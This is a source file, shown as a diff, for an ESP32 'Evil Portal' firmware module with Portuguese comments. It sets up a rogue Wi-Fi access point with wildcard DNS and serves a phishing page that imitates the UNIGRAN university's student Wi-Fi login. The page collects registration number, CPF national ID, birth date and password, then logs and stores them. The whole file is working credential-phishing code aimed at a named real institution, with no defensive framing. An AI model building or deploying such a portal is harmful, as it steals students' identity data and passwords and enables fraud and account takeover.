@@ -1,0 +1,265 @@
+/**
+ * Evil Portal - ESP32 Marauder
+ * FUNCIONANDO - HTML Personalizado UNIGRAN
+ */
+
+#include "evil_portal.h"
+
+static DNSServer dnsServer;
+static AsyncWebServer *server = NULL;
+static bool running = false;
+static String ssidName = "";
+static String portalIP = "";
+static Credential creds[MAX_CREDS];
+static int credCount = 0;
+static bool hasCreds = false;
+
+// HTML PERSONALIZADO UNIGRAN
+const char PAGINA[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Acesso Wi-Fi Acadêmico</title>
+<style>
+    body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .box { background: #fff; width: 100%; max-width: 380px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); overflow: hidden; }
+    .header-bg { background-color: #004a80; padding: 30px 20px; text-align: center; border-bottom: 4px solid #ffcc00; }
+    .logo { max-width: 180px; height: auto; display: block; margin: 0 auto 15px auto; }
+    .badge { background-color: rgba(255, 255, 255, 0.2); color: #fff; font-size: 11px; padding: 4px 12px; border-radius: 20px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; display: inline-block; }
+    .form-body { padding: 30px; }
+    .h1 { color: #333; font-size: 18px; font-weight: 700; text-align: center; margin: 0 0 5px; }
+    .h2 { color: #666; font-size: 13px; font-weight: 400; text-align: center; margin: 0 0 25px; }
+    .grp { position: relative; margin-bottom: 18px; }
+    .grp svg { position: absolute; left: 12px; top: 36px; width: 18px; height: 18px; fill: #004a80; }
+    label { display: block; font-size: 11px; font-weight: 700; color: #555; margin-bottom: 6px; text-transform: uppercase; }
+    input { width: 100%; padding: 12px 12px 12px 40px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; transition: 0.3s; }
+    input:focus { border-color: #004a80; background: #f9fbfd; outline: none; }
+    .no-ico input { padding-left: 12px; }
+    .btn { width: 100%; background: #004a80; color: #fff; border: none; padding: 14px; font-size: 15px; font-weight: 700; border-radius: 4px; cursor: pointer; text-transform: uppercase; transition: background 0.2s; }
+    .btn:hover { background: #003359; }
+    .foot { margin-top: 20px; font-size: 11px; color: #999; text-align: center; line-height: 1.4; }
+</style>
+</head>
+<body>
+<div class="box">
+    <div class="header-bg">
+        <img src="data:image/png;base64,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" alt="Unigran" class="logo">
+        <div class="badge">Conexão Wi-Fi Estudantil</div>
+    </div>
+    <div class="form-body">
+        <div class="h1">Bem-vindo(a) de volta!</div>
+        <div class="h2">Insira suas credenciais para liberar o acesso.</div>
+        <form action="/login" method="get">
+            <div class="grp">
+                <label>RGM</label>
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <input type="text" name="rgm" placeholder="Registro Geral de Matrícula" required>
+            </div>
+            <div class="grp no-ico">
+                <label>CPF</label>
+                <input type="text" name="cpf" placeholder="000.000.000-00" required>
+            </div>
+            <div class="grp no-ico">
+                <label>Data de Nascimento</label>
+                <input type="text" name="nasc" placeholder="DD/MM/AAAA" required>
+            </div>
+            <div class="grp">
+                <label>Senha Acadêmica</label>
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                <input type="password" name="pass" placeholder="Sua senha do portal" required>
+            </div>
+            <button type="submit" class="btn">Conectar Gratuitamente</button>
+        </form>
+        <div class="foot">© UNIGRAN Educacional<br>Acesso Seguro e Monitorado</div>
+    </div>
+</div>
+</body>
+</html>
+)rawliteral";
+
+// Pagina de sucesso apos login
+const char SUCESSO[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Conectado</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f2f5;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.box{background:#fff;padding:50px 30px;border-radius:8px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.1);max-width:360px;width:100%;border-top:4px solid #28a745}
+.check{color:#28a745;font-size:72px;margin-bottom:20px}
+h1{color:#333;font-size:24px;margin:0 0 10px}
+p{color:#666;font-size:14px;margin:5px 0}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="check">✔</div>
+<h1>Conectado!</h1>
+<p>Seu acesso foi liberado com sucesso.</p>
+<p>Você já pode navegar normalmente.</p>
+</div>
+</body>
+</html>
+)rawliteral";
+
+// Verifica se o Host eh de captive portal detection
+bool isCaptivePortalRequest(String host) {
+  host.toLowerCase();
+  return (host.indexOf("apple") >= 0 || host.indexOf("iphone") >= 0 ||
+          host.indexOf("icloud") >= 0 || host.indexOf("google") >= 0 ||
+          host.indexOf("gstatic") >= 0 || host.indexOf("android") >= 0 ||
+          host.indexOf("microsoft") >= 0 ||
+          host.indexOf("msftconnecttest") >= 0 || host.indexOf("netcts") >= 0 ||
+          host.indexOf("captive") >= 0);
+}
+
+// Funcao para enviar pagina do portal
+void sendPortalPage(AsyncWebServerRequest *req) {
+  AsyncWebServerResponse *response =
+      req->beginResponse(200, "text/html", FPSTR(PAGINA));
+  response->addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  response->addHeader("Pragma", "no-cache");
+  response->addHeader("Expires", "-1");
+  req->send(response);
+}
+
+// Handler universal
+void handleAnyRequest(AsyncWebServerRequest *req) {
+  String host = req->host();
+  String url = req->url();
+  String clientIP = req->client()->remoteIP().toString();
+
+  Serial.printf("[Portal] %s %s | Host: %s | From: %s\n", req->methodToString(),
+                url.c_str(), host.c_str(), clientIP.c_str());
+
+  if (isCaptivePortalRequest(host)) {
+    Serial.println("[Portal] -> Captive Portal Detected!");
+  }
+
+  sendPortalPage(req);
+}
+
+void evil_portal_init() {
+  LittleFS.begin(true);
+  pinMode(LED_STATUS, OUTPUT);
+  digitalWrite(LED_STATUS, LOW);
+  Serial.println("[Portal] Init OK");
+}
+
+bool evil_portal_start(const char *ssid) {
+  if (running)
+    return false;
+
+  ssidName = String(ssid);
+
+  IPAddress apIP(172, 0, 0, 1);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(ssid);
+  delay(500);
+
+  portalIP = WiFi.softAPIP().toString();
+  Serial.printf("[Portal] AP IP: %s\n", portalIP.c_str());
+
+  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
+  dnsServer.start(53, "*", WiFi.softAPIP());
+
+  server = new AsyncWebServer(80);
+
+  // Rota de captura /login
+  server->on("/login", HTTP_GET, [](AsyncWebServerRequest *req) {
+    Serial.println("\n========== CAPTURA ==========");
+
+    String rgm = req->hasParam("rgm") ? req->getParam("rgm")->value() : "";
+    String cpf = req->hasParam("cpf") ? req->getParam("cpf")->value() : "";
+    String nasc = req->hasParam("nasc") ? req->getParam("nasc")->value() : "";
+    String pass = req->hasParam("pass") ? req->getParam("pass")->value() : "";
+
+    Serial.println("RGM:  " + rgm);
+    Serial.println("CPF:  " + cpf);
+    Serial.println("NASC: " + nasc);
+    Serial.println("PASS: " + pass);
+    Serial.println("==============================\n");
+
+    if (credCount < MAX_CREDS && (rgm != "" || pass != "")) {
+      creds[credCount].username =
+          "RGM:" + rgm + " CPF:" + cpf + " NASC:" + nasc;
+      creds[credCount].password = pass;
+      creds[credCount].ip = req->client()->remoteIP().toString();
+      creds[credCount].timestamp = String(millis() / 1000) + "s";
+      credCount++;
+      hasCreds = true;
+      Serial.printf("[Portal] >>> Credencial #%d SALVA! <<<\n", credCount);
+    }
+
+    req->send(200, "text/html", FPSTR(SUCESSO));
+  });
+
+  // Rota principal e fallback
+  server->on("/", HTTP_GET,
+             [](AsyncWebServerRequest *req) { handleAnyRequest(req); });
+
+  server->onNotFound([](AsyncWebServerRequest *req) { handleAnyRequest(req); });
+
+  server->begin();
+  running = true;
+  Serial.printf("[Portal] ATIVO: %s (IP: %s)\n", ssid, portalIP.c_str());
+  Serial.println("[Portal] Aguardando conexoes...\n");
+  return true;
+}
+
+void evil_portal_stop() {
+  if (!running)
+    return;
+  dnsServer.stop();
+  if (server) {
+    server->end();
+    delete server;
+    server = NULL;
+  }
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_STA);
+  digitalWrite(LED_STATUS, LOW);
+  hasCreds = false;
+  running = false;
+  Serial.println("[Portal] Parado");
+}
+
+bool evil_portal_is_running() { return running; }
+
+void evil_portal_loop() {
+  if (running) {
+    dnsServer.processNextRequest();
+    digitalWrite(LED_STATUS, hasCreds ? HIGH : LOW);
+  }
+}
+
+int evil_portal_get_cred_count() { return credCount; }
+Credential *evil_portal_get_cred(int i) {
+  return (i >= 0 && i < credCount) ? &creds[i] : NULL;
+}
+void evil_portal_clear_creds() {
+  credCount = 0;
+  hasCreds = false;
+  Serial.println("[Portal] Limpo");
+}
+void evil_portal_list_creds() {
+  if (credCount == 0) {
+    Serial.println("Nenhum dado.");
+    return;
+  }
+  for (int i = 0; i < credCount; i++)
+    Serial.printf("[%d] %s | %s | IP:%s\n", i, creds[i].username.c_str(),
+                  creds[i].password.c_str(), creds[i].ip.c_str());
+}
+bool evil_portal_set_template(const char *f) { return true; }
+void evil_portal_list_templates() {}
+void evil_portal_status() {
+  Serial.printf("Status: %s | SSID: %s | Capturas: %d\n",
+                running ? "ON" : "OFF", ssidName.c_str(), credCount);
+}
